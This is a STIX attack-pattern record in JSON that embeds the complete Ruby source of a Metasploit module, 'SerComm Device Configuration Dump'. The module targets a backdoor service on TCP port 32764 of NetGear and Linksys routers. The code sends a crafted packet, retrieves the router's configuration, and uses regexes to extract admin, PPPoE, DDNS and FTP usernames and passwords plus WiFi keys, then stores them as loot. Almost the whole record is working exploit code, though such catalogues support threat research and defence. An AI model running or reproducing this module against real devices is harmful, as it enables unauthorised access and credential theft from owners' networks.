{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--26be3c31-1356-4c15-b110-84daf09e0db3",
    "created": "2024-08-14T16:22:34.945179Z",
    "modified": "2024-08-14T16:22:34.945183Z",
    "name": "\"SerComm Device Configuration Dump\"",
    "description": " This module will dump the configuration of several SerComm devices. These devices typically include routers from NetGear and Linksys. This module was tested successfully against the NetGear DG834 series ADSL modem router.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/misc/sercomm_dump_config.rb",
            "external_id": "sercomm_dump_config.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/elvanderb/TCP-32764"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n\n  SETTINGS = {\n    'Creds' => [\n      [ 'HTTP Web Management', { 'user' => /http_username=(\\S+)/i, 'pass' => /http_password=(\\S+)/i } ],\n      [ 'HTTP Web Management Login', { 'user' => /login_username=(\\S+)/i, 'pass' => /login_password=(\\S+)/i } ],\n      [ 'PPPoE', { 'user' => /pppoe_username=(\\S+)/i, 'pass' => /pppoe_password=(\\S+)/i } ],\n      [ 'PPPoA', { 'user' => /pppoa_username=(\\S+)/i, 'pass' => /pppoa_password=(\\S+)/i } ],\n      [ 'DDNS', { 'user' => /ddns_user_name=(\\S+)/i, 'pass' => /ddns_password=(\\S+)/i } ],\n      [ 'CMS', {'user' => /cms_username=(\\S+)/i, 'pass' => /cms_password=(\\S+)/i } ], # Found in some cameras\n      [ 'BigPondAuth', {'user' => /bpa_username=(\\S+)/i, 'pass' => /bpa_password=(\\S+)/i } ], # Telstra\n      [ 'L2TP', { 'user' => /l2tp_username=(\\S+)/i, 'pass' => /l2tp_password=(\\S+)/i } ],\n      [ 'FTP', { 'user' => /ftp_login=(\\S+)/i, 'pass' => /ftp_password=(\\S+)/i } ],\n    ],\n    'General' => [\n      ['Wifi SSID', /wifi_ssid=(\\S+)/i],\n      ['Wifi Key 1', /wifi_key1=(\\S+)/i],\n      ['Wifi Key 2', /wifi_key2=(\\S+)/i],\n      ['Wifi Key 3', /wifi_key3=(\\S+)/i],\n      ['Wifi Key 4', /wifi_key4=(\\S+)/i],\n      ['Wifi PSK PWD', /wifi_psk_pwd=(\\S+)/i]\n    ]\n  }\n\n  attr_accessor :endianess\n  attr_accessor :credentials\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"SerComm Device Configuration Dump\",\n      'Description'    => %q{\n        This module will dump the configuration of several SerComm devices. These devices\n        typically include routers from NetGear and Linksys. This module was tested\n        successfully against the NetGear DG834 series ADSL modem router.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>', # Initial discovery, poc\n          'Matt \"hostess\" Andreko <mandreko[at]accuvant.com>' # Msf module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '101653' ],\n          [ 'URL', 'https://github.com/elvanderb/TCP-32764' ]\n        ],\n      'DisclosureDate' => '2013-12-31' ))\n\n      register_options(\n        [\n          Opt::RPORT(32764),\n        ])\n  end\n\n  def run\n    print_status(\"Attempting to connect and check endianess...\")\n    @endianess = fingerprint_endian\n    @credentials = {}\n\n    if endianess.nil?\n      print_error(\"Failed to check endianess, aborting...\")\n      return\n    end\n    print_good(\"#{string_endianess} device found...\")\n\n    print_status(\"Attempting to connect and dump configuration...\")\n    config = dump_configuration\n\n    if config.nil?\n      print_status(\"Error retrieving configuration, aborting...\")\n      return\n    end\n\n    loot_file = store_loot(\"router.config\", \"text/plain\", rhost, config[:data], \"#{rhost}router_config.txt\", \"Router Configurations\")\n    print_good(\"Router configuration dump stored in: #{loot_file}\")\n\n    parse_configuration(config[:data])\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  private\n\n  def little_endian?\n    return endianess == 'LE'\n  end\n\n  def big_endian?\n    return endianess == 'BE'\n  end\n\n  def string_endianess\n    if little_endian?\n      return \"Little Endian\"\n    elsif big_endian?\n      return \"Big Endian\"\n    end\n\n    return nil\n  end\n\n\n  def fingerprint_endian\n    begin\n      connect\n      sock.put(Rex::Text.rand_text(5))\n      res = sock.get_once(-1, 10)\n      disconnect\n    rescue Rex::ConnectionError => e\n      print_error(\"Connection failed: #{e.class}: #{e}\")\n      return nil\n    end\n\n    unless res\n      return nil\n    end\n\n    if res.start_with?(\"MMcS\")\n      return 'BE'\n    elsif res.start_with?(\"ScMM\")\n      return 'LE'\n    end\n\n    return nil\n  end\n\n  def dump_configuration\n    if big_endian?\n      pkt = [0x4d4d6353, 0x01, 0x00].pack(\"NVV\")\n    elsif little_endian?\n      pkt = [0x4d4d6353, 0x01, 0x00].pack(\"VNN\")\n    else\n      return nil\n    end\n\n    connect\n    sock.put(pkt)\n    res = sock.get_once(-1, 10)\n\n    disconnect\n\n    if res.blank?\n      vprint_error(\"No answer...\")\n      return\n    end\n\n    if big_endian?\n      mark, zero, length, data = res.unpack(\"NVVa*\")\n    else\n      mark, zero, length, data = res.unpack(\"VNNa*\")\n    end\n\n    unless mark == 0x4d4d6353\n      vprint_error(\"Incorrect mark when reading response\")\n      return nil\n    end\n\n    unless zero == 0\n      vprint_error(\"Incorrect zero when reading response\")\n      return nil\n    end\n\n    unless length == data.length\n      vprint_warning(\"Inconsistent length / data packet\")\n      # return nil\n    end\n\n    return { :length => length, :data => data }\n  end\n\n  def parse_configuration(data)\n    configs = data.split(?\\x00)\n\n    if datastore['VERBOSE']\n      vprint_status('All configuration values:')\n      configs.sort.each do |i|\n        if i.strip.match(/.*=\\S+/)\n          vprint_status(i)\n        end\n      end\n    end\n\n    configs.each do |config|\n      parse_general_config(config)\n      parse_auth_config(config)\n    end\n\n    @credentials.each do |k,v|\n      next unless v[:user] and v[:password]\n      print_good(\"#{k}: User: #{v[:user]} Pass: #{v[:password]}\")\n      report_cred(\n        ip: rhost,\n        port: rport,\n        user: v[:user],\n        password: v[:password],\n        service_name: 'sercomm',\n        proof: v.inspect\n      )\n    end\n\n  end\n\n  def parse_general_config(config)\n    SETTINGS['General'].each do |regex|\n      if config.match(regex[1])\n        value = $1\n        print_status(\"#{regex[0]}: #{value}\")\n      end\n    end\n  end\n\n  def parse_auth_config(config)\n    SETTINGS['Creds'].each do |cred|\n      @credentials[cred[0]] = {} unless @credentials[cred[0]]\n\n      # find the user/pass\n      if config.match(cred[1]['user'])\n        @credentials[cred[0]][:user] = $1\n      end\n\n      if config.match(cred[1]['pass'])\n        @credentials[cred[0]][:password] = $1\n      end\n\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-12-31 "
}